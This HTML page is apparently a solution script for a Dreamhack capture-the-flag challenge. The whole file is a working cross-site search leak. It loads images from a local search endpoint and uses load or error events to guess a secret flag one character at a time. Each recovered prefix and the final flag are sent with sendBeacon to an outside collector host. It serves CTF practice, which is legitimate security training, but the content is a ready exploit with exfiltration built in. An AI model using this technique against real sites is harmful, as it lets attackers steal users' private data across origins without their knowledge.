<!doctype html>
<body>
<script>
const alphabet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_';
let known = 'DH{'; 

function probe(candidate) {
  return new Promise(resolve => {
    const img = new Image();
    img.onload = () => resolve(true);  
    img.onerror = () => resolve(false); 
    img.src = 'http://localhost:3000/posts/search?query=' +
              encodeURIComponent(candidate) + '&t=' + Math.random();
    document.body.appendChild(img);
  });
}

async function leak() {
  while (!known.endsWith('}')) {
    for (const c of alphabet) {
      if (await probe(known + c)) {
        known += c;
        navigator.sendBeacon('https://bllcrad.request.dreamhack.games/leak', known);
        break;
      }
    }
  }
  navigator.sendBeacon('https://bllcrad.request.dreamhack.games/leak', 'FLAG=' + known);
}
leak();
</script>
</body>
